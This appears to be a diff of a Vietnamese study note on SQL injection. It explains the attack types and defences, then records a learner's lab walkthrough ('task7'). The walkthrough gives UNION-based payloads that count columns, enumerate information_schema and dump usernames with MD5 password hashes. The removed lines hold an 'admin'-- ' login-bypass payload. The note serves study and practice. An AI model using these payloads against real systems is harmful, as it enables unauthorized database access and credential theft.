@@ -4,19 +4,23 @@
 ## 1. SQLi
 là cuộc tấn công mà attacker can thiệp vào cơ sở dữ liệu thông qua các câu truy vấn để truy xuất, sửa đổi, xóa hoặc gây ảnh hướng đến database hay nội dung thao tác của người dùng.
 ## 2. Hậu quả của SQLi
-Một cuộc tấn công SQLi thành công có thể khiến những dữ liệu nhạy cảm bị truy cập trái pháp. Tài khoản ngân hàng, tài khoản mạng xã hội, số điện thoại, thông tin cá nhân,... Nhiều vụ vi phạm dữ liệu nghiêm trọng gần đây là kết quả của các cuộc tấn công SQLi. Không chỉ vậy nó còn làm ảnh hưởng đến uy tín của đơn vị chủ quản. Trong một số trường hợp kẻ tấn công có thể chiếm dược 1 backdoor vào hệ thống của tổ chức dẫn đến sự xâm phạm kéo dài không được chú ý gây khó khăn cho việc điều tra.
+SQLi đơn giản có thể giúp người tấn công thêm, sửa xóa dữ liệu trong database
+Một cuộc tấn công SQLi thành công có thể dẫn đến RCE khiến những dữ liệu nhạy cảm bị truy cập trái pháp. Tài khoản ngân hàng, tài khoản mạng xã hội, số điện thoại, thông tin cá nhân,... Nhiều vụ vi phạm dữ liệu nghiêm trọng gần đây là kết quả của các cuộc tấn công SQLi. Không chỉ vậy nó còn làm ảnh hưởng đến uy tín của đơn vị chủ quản. Trong một số trường hợp kẻ tấn công có thể chiếm dược 1 backdoor vào hệ thống của tổ chức dẫn đến sự xâm phạm kéo dài không được chú ý gây khó khăn cho việc điều tra.
 ## 3. SQLi hoạt động
 * đầu tiên attacker sẽ tìm các điểm yếu trên web như input, parameter,...
 * sau đó attacker sử dụng các câu lệnh SQL cùng với các ký tự khác để xác định cách truy cập vào database
 * cuối dùng dùng các câu lệnh SQL để tấn công
 ## 4. Các loại SQL 
-![](https://i.imgur.com/SsmY2Zf.png)
+![](https://i.imgur.com/sFIM3rU.png)
+
 có 3 loại chính là
-* error based SQLi: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc database từ đó tìm ra cách truy cập vào database
-* Union based SQLi: Sử dụng câulệnh UNION trong các truy vấn SQL để truy cập vào database
-* Blind SQLi: các phản hồi nhận được không chứa kết quả của truy vấn. Blind lại được chia làm 2 loại:
+* in-band SQLi: được chia làm 2 nhánh nhỏ
+    * error based SQLi: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc database từ đó tìm ra cách truy cập vào database
+    * Union based SQLi: Sử dụng câulệnh UNION trong các truy vấn SQL để truy cập vào database
+* Blind(inferential) SQLi: các phản hồi nhận được không chứa kết quả của truy vấn. Blind lại được chia làm 2 loại:
     * Boolean: câu truy vấn trả về đúng hoặc sai từ đó attacker điều chỉnh câu truy vấn
     * time-based: attacker sẽ sử dụng câu truy vấn làm database trả về kết quả trong 1 thời ịnh tùy thuộc vào thuộc tính đúng sai, từ đó điều chỉnh câu truy vấn để khai thác.
+* out-of-band SQLi: là một loại SQLi mà kẻ tấn công không nhận được phản hồi từ ứng dụng bị tấn công trên cùng một kênh. mà thay vào đó có thể kiến ứng dụng gửi dữ liệu đến một điểm từ xa mà họ quản lý. Kiểu tấn công này chỉ có thể xảy ra khi mà bạn sử dụngcác lệnh kích hoạt các yêu cầu DNS hoặc HTTP. Tuy nhiên, đó là trường hợp của tất cả các máy chủ SQL phổ biến.
 ## 5. Cách phòng chống SQLi
 * Lọc dữ liệu từ người dùng: Cách phòng chống này tương tự như XSS. Ta sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. Nên sử dụng thư viện/function được cung cấp bởi framework. Viết lại từ đầu vừa tốn thời gian vừa dễ sơ sót.
 * Không cộng chuỗi để tạo SQL: Sử dụng parameter thay vì cộng chuỗi. Nếu dữ liệu truyền vào không hợp pháp, SQL Engine sẽ tự động báo lỗi, ta không cần dùng code để check.
@@ -31,24 +35,13 @@ có 3 loại chính là
 
 ### Khai thác:
 #### error-based:
-Chèn một truy vấn độc hại với mục tiêu nhận được thông báo lỗi cung cấp thông tin nhạy cảm về db.
-Phá bỏ tính logic của ứng dụng:
-ví dụ 
-``` php 
-"SELECT * FROM user WHERE username='$username' and password='$password' ";
- ```
- với dòng kiểm tra như trên chúng ta có thể đăng nhập vào với admin mà không cần sử dụng pasword bằng cách nhập tên đăng nhập 
-với payload:  `admin'-- ` hoặc dùng `admin' OR 1=1 -- `
-khi đó câu truy vấn sẽ bị comment hết phần từ sau. 
-``` php 
-"SELECT * FROM user WHERE username='admin'-- and password='$password' ";
- ```
+Thực hiện chèn các câu truy vấn độc hại với mục tiêu thông qua input, sau đó dựa vào thông báo lỗi để thu thập thông tin về cấu trúc của database như tên database, tên bảng số cột tên cột và thậm chí là thông tin trong bảng.
 
 
 #### Union-based:
 Trả về kết quả của các câu lệnh SELECT từ bảng khác với điều kiện trả về cùng số cột và kiểu dữ liệu của cột.
 
-Xác định số cột cần để tấn công: Sử dụng ORDER BY ví dụ ' ORDER BY x-- với x là số cột cần thử và từ phản hồi tìm được số cột.
+Xác định số cột cần để tấn công: Sử dụng ORDER BY để thu thập thông tin về database ví dụ ' ORDER BY x-- với x là số cột cần thử và từ phản hồi tìm được số cột.
 
 có 2 cách thường được sử dụng để tìm số cột của bảng.
  sử dụng `UNION SELECT`:
@@ -129,9 +122,39 @@ password: 0cc175b9c0f1b6a831c399e269772661
 
 ### UNION
 ... 
-em thử đúng 1 payload là: `' OR 1=1 ORDER BY 1 -- ` 
-![](https://i.imgur.com/NzqaE0i.png)
-xong rùi nó hiện ra hết thông tin lun TvT
-username: admin
-password: 0cc175b9c0f1b6a831c399e269772661
-đem password đi md5decode ta được pass ban đầu là a
+nhập payload vào username như error-based
+đầu tiên em thử payload: `1' ORDER BY 1-- ` 
+![](https://i.imgur.com/DUPeQT4.png)
+web trả về null. 
+tương tự với 
+`1' ORDER BY 2-- `
+`1' ORDER BY 3-- `
+nhưng đến `1' ORDER BY 4-- ` thì web báo lỗi.
+![](https://i.imgur.com/KZ4Ytp1.png)
+ Vậy là chúng ta biết được rằng bảng có 3 cột.
+ sau đó em sẽ kiểm tra xem dữ liệu có thể truy xuất được từ cột nào trong 3 cột bằng payload:
+ `' UNION SELECT 'a','b','c' -- `
+ ![](https://i.imgur.com/w7NTsQV.png)
+vậy là cả 3 cột đều có thể truy suất được dữ liệu. 
+tiếp theo em sẽ tìm tên database bằng payload: 
+`' UNION SELECT database(),null,null -- `
+![](https://i.imgur.com/C7YA1qL.png)
+từ vị trí đầu ta thu được tên database là task7, tiếp theo là tìm tên bảng trong database bằng payload: 
+`' UNION SELECT GROUP_CONCAT(table_name),null,null FROM information_schema.tables WHERE table_schema='task7'-- `
+![](https://i.imgur.com/6AIZQrr.png)
+thu được tên bảng là user
+tiếp tục tìm các cột trong database task7 bảng user với payload: `' UNION SELECT GROUP_CONCAT(column_name),null,null FROM information_schema.columns WHERE table_name='user' and table_schema='task7'-- `
+![](https://i.imgur.com/eSA6Tse.png)
+thu được tên 3 cột lần lượt là id,username,password. việc cuối cùng là truy xuất tất cả thông tin trong bảng thôi. payload: 
+`' UNION SELECT GROUP_CONCAT(CONCAT(id,'~',username,'~',password)),null,null FROM user -- `
+![](https://i.imgur.com/wqyG2NE.png)
+kết quả thu hoạch:
+user:admin
+pwd:0cc175b9c0f1b6a831c399e269772661
+user:test1
+pwd:5a105e8b9d40e1329780d62ea2265d8a
+user:123
+pwd:202cb962ac59075b964b07152d234b70
+yeahhh!
+
+
